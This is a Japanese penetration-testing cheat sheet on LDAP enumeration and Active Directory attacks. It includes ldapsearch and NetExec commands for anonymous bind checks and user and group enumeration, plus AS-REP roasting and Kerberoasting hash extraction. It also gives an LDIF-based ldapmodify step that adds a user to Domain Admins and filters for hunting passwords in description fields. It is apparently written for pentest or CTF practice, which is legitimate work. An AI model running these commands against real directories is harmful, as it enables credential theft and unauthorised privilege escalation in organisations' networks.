# 目的・シチュエーション

目的：
- ユーザー、グループ、ドメイン構成、機密属性の列挙
- 認証情報の抜き出し（Kerberoasting / ASREPRoastingのターゲット特定）    
- 不適切なアクセス制御（Anonymous Bind等）の特定と悪用

シチュエーション：
- ターゲットがActive Directoryやディレクトリサービスを運用している
- Port: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog) がopen

---

# 基本情報

## LDAPとは

- LDAP (Lightweight Directory Access Protocol) は、ネットワーク上のディレクトリサービスに接続・照会・編集するためのプロトコル
- Active Directoryの基盤として利用される
- **Root DSE**: サーバー自体に関する情報（サポートする機能やベースDNなど）を保持する特殊なエントリ

## 主要ポートとプロトコル

| サービス名          | ポート           | 役割・特徴                           |
| -------------- | ------------- | ------------------------------- |
| LDAP           | 389 (TCP/UDP) | 標準的な非暗号化接続（StartTLSで暗号化する場合もあり） |
| LDAPS          | 636 (TCP)     | SSL/TLSによる暗号化接続                 |
| Global Catalog | 3268 / 3269   | マルチドメイン環境でのフォレスト全体の検索用          |

# Enumeration

主なツール：ldapsearch, nmap, NetExec

## Recon

Root DSEの取得（サーバー情報の詳細確認）
```sh
ldapsearch -x -H ldap://<TargetIP> -b "" -s base "(objectclass=*)"
```
- `defaultNamingContext`を確認して、以降の検索に使う **`<BaseDN>`** とする

## 認証なし列挙（Anonymous / Null Bind）

認証なしで情報を閲覧できる設定になっているか確認する
```sh
# Anonymous Bindのテスト
ldapsearch -x -H ldap://<TargetIP> -b "<BaseDN>"

# Nullパスワードでの試行
ldapsearch -x -H ldap://<TargetIP> -D "" -w "" -b "<BaseDN>"
```
- 失敗の場合、"...bind must be completed..."と表示される

## ユーザー・グループの列挙

### ldapsearch (認証あり)

```sh
# 全ユーザーの取得
ldapsearch -x -H ldap://<TargetIP> -D '<username>@<domain>' -w '<pw>' -b '<BaseDN>' "(objectClass=user)" | grep '^dn:'

# 全グループの取得
ldapsearch -x -H ldap://<TargetIP> -D "<username>@<domain>" -w '<pw>' -b "<BaseDN>" "(objectClass=group)"

# 特定グループ（Domain Admins等）のメンバー確認
ldapsearch -x -H ldap://<TargetIP> -b "<BaseDN>" "(cn=Domain Admins)" member

# 特定ユーザーのプロパティ取得
ldapsearch -x -H ldap://<TargetIP> -D "<username>@<domain>" -w '<pw>' -b "<UsereDN>"
```

### NetExec

```sh
# 認証情報の有効性確認
nxc ldap <TargetIP> -u '<username>' -p '<pw>'

# ユーザー一覧の取得
netexec ldap <TargetIP> -u <username> -p <pw> --users

# グループ一覧の取得
netexec ldap <TargetIP> -u <username> -p <pw> --groups
```

モジュール利用
```sh
# モジュールの列挙
netexec ldap -L

# 正規認証情報とモジュールを用いて内部からユーザー等の列挙
netexec ldap <TargetIP> -u '<username>' -p '<pw>' -M <module>
```

💡BloodHound用データ取得
```sh
netexec ldap <LDAPserverIP> -u <username> -p '<pw>' --bloodhound --collection All --dns-server <DNSserverIP>
```

## AD認証エクスプロイト可能なターゲット特定

💡BloodHoundでエクスプロイト可能なユーザーを探し、リモートから実行するのが簡単

### 💥AS-REPRoasting

1. Pre-Authenticationが無効なユーザーの探索
```sh
ldapsearch -x -H ldap://<TargetIP> -D "<username>@<domain>" -w '<pw>' -b "<BaseDN>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

2. AS-REP Roastingの実行k
```sh
nxc ldap <TargetIP> -u <username> -p '' --asreproast output.txt
```
- 認証情報なしでも実行可能だが、認証情報があればすべてのユーザーに対して攻撃可能
- 参考：[ASREPRoast - NetExec](https://www.netexec.wiki/ldap-protocol/asreproast)
- impacketの場合：[💥AD認証システムの攻撃](../🪟Windows/Active%20Directory/💥AD認証システムの攻撃.md#AS-REP%20Roasting%20w/%20impacket（リモート実行）)

### 💥Kerberoasting

1. Kerberoastingが可能なユーザーの列挙
```sh
# 候補ユーザーとして、SPNが設定されたユーザーの列挙
# ⚠️そのままnxcでkerberoasting実行でも問題ない
ldapsearch -x -H ldap://<TargetIP> -D "<username>@<domain>" -w '<pw>' -b "<BaseDN>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

2. Kerberoastingの実行
```sh
# 認証情報アリ
nxc ldap <TargetIP> -u <username> -p <pw> --kerberoasting output.txt

# 認証情報なし（AS-REP可能なユーザーが存在する必要あり）
nxc ldap <TargetIP> -u <AS-REP_roastable_username> -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```
- `kerberoastable.list`にはステップ１の`ldapsearch`で発見したユーザー名を複数記載
- 参考：[Kerberoasting - NetExec](https://www.netexec.wiki/ldap-protocol/kerberoasting)
- impacketの場合：[💥AD認証システムの攻撃](../🪟Windows/Active%20Directory/💥AD認証システムの攻撃.md#Kerberoasting%20w/%20Impacket)

# Post-Exploitation

## 権限昇格（Group Modification）

- `ldapmodify` を使い、LDIFファイル経由でユーザーをグループに追加する
- 対象グループに対してAddMemberなどの権限が必要

1. LDIFファイルの作成 (例: add_admin.ldif)
```sh
dn: cn=Domain Admins,cn=Users,<BaseDN>
changetype: modify
add: member
member: cn=<user>,cn=Users,<BaseDN>
```
- `dn:`に続くものは、オブジェクトのDN（`cn`に続くのは追加したいユーザーのDN）
![[Pasted image 20260210205648.png]]


2. 実行
```sh
ldapmodify -x -H ldap://<TargetIP> -D "<high_priv_userDN>" -w '<pw>' -f <file.ldif>
```
- `-D`：そのグループオブジェクトに対して特権(GenericAllなど)をもつユーザーのDNを指定

## よく使うLDAPフィルタ

| フィルタ                                                 | 意味                                |
| ---------------------------------------------------- | --------------------------------- |
| `(objectClass=user)`                                 | 全ユーザー                             |
| `(userAccountControl:1.2.840.113556.1.4.803:=2)`     | 無効化されたアカウント                       |
| `(userAccountControl:1.2.840.113556.1.4.803:=65536)` | パスワード無期限                          |
| `(&(description=*pass*))`                            | description属性に "pass" を含む（機密情報探し） |
